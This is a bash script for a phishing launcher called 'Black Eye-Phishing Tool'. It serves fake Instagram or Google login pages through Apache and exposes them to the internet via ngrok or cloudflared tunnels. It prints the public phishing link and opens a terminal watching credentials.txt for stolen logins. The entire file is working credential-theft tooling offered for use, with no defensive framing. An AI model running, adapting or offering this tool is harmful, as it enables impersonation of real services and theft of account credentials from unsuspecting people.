#!/bin/bash

# =============================
# Color Codes
# =============================
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# =============================
# Dependency Check
# =============================
dependencies=(php curl unzip apache2)

for pkg in "${dependencies[@]}"
do
    if ! command -v $pkg &> /dev/null
    then
        echo -e "${RED}[!] $pkg not found. Installing...${NC}"
        sudo apt install $pkg -y
    fi
done

# =============================
# Main Loop
# =============================
while true; do
    clear
    echo -e "${CYAN}========================================="
    echo -e "         🐉 Black Eye-Phishing Tool"
    echo -e "=========================================${NC}"
    echo -e "${GREEN}Select a phishing target:${NC}"
    echo "1) Instagram"
    echo "2) Google"
    echo "3) Exit"
    echo
    read -p "Enter your choice: " choice

    if [ "$choice" -eq 1 ]; then
        site="instagram"
    elif [ "$choice" -eq 2 ]; then
        site="google"
    elif [ "$choice" -eq 3 ]; then
        echo -e "${RED}Goodbye!${NC}"
        exit 0
    else
        echo -e "${RED}Invalid choice! Try again.${NC}"
        sleep 2
        continue
    fi

    echo -e "${CYAN}Starting Apache server...${NC}"
    sudo systemctl start apache2

    echo -e "${CYAN}Launching $site phishing page...${NC}"
    cd /var/www/html/$site

    # =============================
    # Tunnel Selection
    # =============================
    echo
    echo -e "${GREEN}Select tunnel service:${NC}"
    echo "1) Ngrok"
    echo "2) Cloudflared"
    read -p "Enter your tunnel choice: " tunnel

    if [ "$tunnel" -eq 1 ]; then
        echo -e "${CYAN}Starting Ngrok tunnel...${NC}"

        if [ ! -f "./ngrok" ]; then
            echo -e "${RED}[!] Ngrok not found. Downloading...${NC}"
            wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
            unzip ngrok-stable-linux-amd64.zip
            rm ngrok-stable-linux-amd64.zip
            chmod +x ngrok
        fi

        gnome-terminal -- ./ngrok http 80 > /dev/null &
        sleep 5
        NGROK_URL=$(curl -s localhost:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' | head -n1)

        echo -e "${GREEN}Phishing page is live at: ${NGROK_URL}${NC}"

    elif [ "$tunnel" -eq 2 ]; then
        echo -e "${CYAN}Starting Cloudflared tunnel...${NC}"
        sudo apt install cloudflared -y
        gnome-terminal -- cloudflared tunnel --url http://localhost > /dev/null &
        sleep 5
        CLOUDFLARE_URL=$(curl -s localhost:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.trycloudflare.com' | head -n1)

        echo -e "${GREEN}Phishing page should be live via Cloudflared (check terminal).${NC}"
    else
        echo -e "${RED}Invalid tunnel choice! Returning to menu...${NC}"
        sleep 2
        continue
    fi

    echo
    echo -e "${CYAN}Monitoring captured credentials...${NC}"
    gnome-terminal -- tail -f credentials.txt

    echo
    read -p "Press [Enter] to return to the main menu..."
done
